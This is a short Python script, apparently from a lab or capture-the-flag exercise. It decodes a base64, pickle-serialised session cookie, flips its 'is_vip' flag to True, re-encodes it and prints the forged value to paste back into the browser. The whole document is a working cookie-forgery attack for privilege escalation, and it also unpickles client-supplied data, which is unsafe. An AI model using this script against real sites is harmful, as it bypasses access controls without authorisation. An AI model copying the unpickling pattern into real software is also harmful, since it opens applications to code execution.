import base64
import pickle

cookie_value = "gAWVSwAAAAAAAAB9lCiMCWxvZ2dlZF9pbpSIjAR1c2VylIwFeW9zc2mUjAZpc192aXCUiYwIYm9va2luZ3OUXZSMDmxveWFsdHlfcG9pbnRzlEtkdS4="

raw = base64.urlsafe_b64decode(cookie_value.encode())
session = pickle.loads(raw)

print("before:", session)

session["is_vip"] = True

new_raw = pickle.dumps(session, protocol=pickle.HIGHEST_PROTOCOL)
new_cookie = base64.urlsafe_b64encode(new_raw).decode()

print("\nPASTE THIS INTO THE COOKIE:\n")
print(new_cookie)
